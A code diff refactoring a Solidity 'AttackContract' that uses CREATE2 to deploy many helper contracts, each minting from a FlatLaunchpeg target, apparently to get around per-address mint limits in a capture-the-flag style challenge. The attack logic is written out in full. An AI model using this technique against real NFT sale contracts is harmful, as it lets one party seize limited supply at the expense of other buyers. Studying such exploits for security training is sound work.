@@ -19,22 +19,7 @@ contract AttackContract{
         return abi.encodePacked(bytecode, abi.encode(_attackerAddress,_amount, _FlatLaunchpeg));
     }
 
-
-    function getAddress(uint salt,bytes memory bytecode) internal view returns (address) {
-        address predictedAddress = address(uint160(uint(keccak256(
-            abi.encodePacked(
-                bytes1(0xff),
-                address(this), 
-                salt, 
-                keccak256(bytecode) 
-            )
-        ))));
-      
-        return predictedAddress;
-    }
-
-    function createContract(uint salt, bytes memory bytecode) internal{
-        address contractAddress;
+    function createContract(uint salt, bytes memory bytecode) internal returns (address contractAddress){
         assembly {
             contractAddress := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
             if iszero(extcodesize(contractAddress)) {
@@ -44,7 +29,7 @@ contract AttackContract{
     }
 
 
-    function attack(address _attackerAddress, address _FlatLaunchpeg) public {
+    function attack(address _attackerAddress, address _FlatLaunchpeg) public{
         // 69/5 
         uint lenght = 13;
         uint remainder = 4;
@@ -53,22 +38,16 @@ contract AttackContract{
 
         bytes memory contractByte =  getContractBytecode(_attackerAddress, amountTomint, _FlatLaunchpeg);
 
-
         for(uint256 i=0; i<lenght; i++){    
-            createContract(i, contractByte);
-            allcontractdeployed.push(getAddress(i, contractByte));
+            allcontractdeployed.push(createContract(i, contractByte));
         }
 
-        
-        createContract(13,getContractBytecode(_attackerAddress, remainder, _FlatLaunchpeg));
-        allcontractdeployed.push(getAddress(13, getContractBytecode(_attackerAddress,remainder, _FlatLaunchpeg)));
-
+        allcontractdeployed.push(createContract(13, getContractBytecode(_attackerAddress, remainder, _FlatLaunchpeg)));
     }
 
     function returnAlladdress() public view returns(address[] memory){
         return allcontractdeployed;
     }
-
 
 }
 
